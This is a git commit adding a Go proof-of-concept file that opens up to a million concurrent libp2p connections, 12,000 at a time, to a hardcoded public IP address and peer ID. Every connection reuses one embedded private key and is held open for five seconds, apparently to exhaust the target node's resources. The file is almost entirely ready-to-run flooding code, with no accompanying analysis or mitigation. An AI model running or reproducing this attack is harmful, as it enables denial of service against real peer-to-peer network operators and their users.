d4cfce702a2d35e591f0ca598b1ca8edc06aa46b
djordon <dan.jordon@gmail.com>
2025-05-03 18:16:20 -0400

    add the poc attacking files [ci skip]

---
+++ terraform/POC_2.go
@@ -0,0 +1,90 @@
+package main
+
+import (
+        "context"
+        "encoding/base64"
+        "log"
+        "sync"
+        "time"
+
+        libp2p "github.com/libp2p/go-libp2p"
+        peer "github.com/libp2p/go-libp2p/core/peer"
+        crypto "github.com/libp2p/go-libp2p/core/crypto"
+        ma "github.com/multiformats/go-multiaddr"
+)
+
+const (
+        numInstances = 1000000
+)
+
+var (
+        semaphore = make(chan struct{}, 12000) // limit concurrency
+)
+
+const privKeyBase64 = "CAESQEFjR2LYnfoJEzpKjpwTeNAWHSnNCpQztR8ePTKUenPcdvQTOHqdfS+qNZIdtYWRnO+40WPoaFpld743Q3XVhpU="
+
+func getIdentity() (crypto.PrivKey, error) {
+        keyBytes, err := base64.StdEncoding.DecodeString(privKeyBase64)
+        if err != nil {
+                return nil, err
+        }
+        return crypto.UnmarshalPrivateKey(keyBytes)
+}
+
+func connectAndClose(targetAddr ma.Multiaddr, instanceID int, wg *sync.WaitGroup) {
+        defer wg.Done()
+        semaphore <- struct{}{}        // acquire
+        defer func() { <-semaphore }() // release
+
+        ctx := context.Background()
+
+        privKey, err := getIdentity()
+        if err != nil {
+                log.Printf("[Instance %d] Failed to get identity: %s", instanceID, err)
+                return
+        }
+
+        h, err := libp2p.New(libp2p.Identity(privKey))
+        if err != nil {
+                log.Printf("[Instance %d] Failed to create host: %s", instanceID, err)
+                return
+        }
+        defer h.Close()
+
+        // Extract peer info without expecting peer ID
+        peerInfo, err := peer.AddrInfoFromP2pAddr(targetAddr)
+        if err != nil {
+                log.Printf("[Instance %d] Failed to parse peer info: %s", instanceID, err)
+                return
+        }
+
+        // Remove any hardcoded peer ID to allow libp2p to validate the actual peer
+
+        if err := h.Connect(ctx, *peerInfo); err != nil {
+                log.Printf("[Instance %d] Connection failed: %s", instanceID, err)
+                return
+        }
+
+        log.Printf("[Instance %d] Connected to peer %s", instanceID, peerInfo.ID)
+
+        time.Sleep(5 * time.Second)
+}
+
+func main() {
+        target := "/ip4/143.244.141.60/tcp/4122/p2p/16Uiu2HAmJCCQmWYiiQDxD88SGWKiPc6XgXLRKZhu8jMmyzdpQXSV"
+
+        maddr, err := ma.NewMultiaddr(target)
+        if err != nil {
+                log.Fatalf("Invalid multiaddress: %s", err)
+        }
+
+        log.Printf("Starting connection test with %d instances...", numInstances)
+
+        var wg sync.WaitGroup
+        for i := 0; i < numInstances; i++ {
+                wg.Add(1)
+                go connectAndClose(maddr, i, &wg)
+        }
+        wg.Wait()
+        log.Println("All connections completed.")
+}
